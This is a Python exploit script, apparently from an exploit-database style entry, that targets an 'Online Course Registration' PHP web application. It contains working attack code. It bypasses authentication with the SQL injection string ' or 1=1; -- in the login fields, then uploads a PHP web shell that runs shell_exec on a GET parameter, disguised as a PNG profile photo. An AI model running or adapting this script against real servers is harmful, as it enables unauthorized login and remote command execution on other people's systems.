# Exploit Title:
# Exploit Author: Bobby Cooke
# Date: 
# Vendor Homepage: 
# Software Link: 
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    #SERVER_URL = sys.argv[1]
    SERVER_URL = 'http://172.16.65.130/Online Course Registration/'
    LOGIN_URL  = SERVER_URL + 'index.php'
    PROFILE_URL = SERVER_URL + 'my-profile.php'
    s = requests.Session()
    bypass_data = {'regno' : '\' or 1=1; -- boku', 'password' : '\' or 1=1; -- boku', 'submit' : ''}
    s.get(SERVER_URL, verify=False)
    auth_bypass = s.post(url=LOGIN_URL, data=bypass_data, verify=False)
    avatar_img  = {
                'photo': 
                  (
                    'kaio-ken.php', 
                    '<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    upld_data = {'studentname':'student', 'studentregno':'123','Pincode':'328495','cgpa':'0.00','submit':''}
    webshell_upload = s.post(url=PROFILE_URL, files=avatar_img, data=upld_data, verify=False)
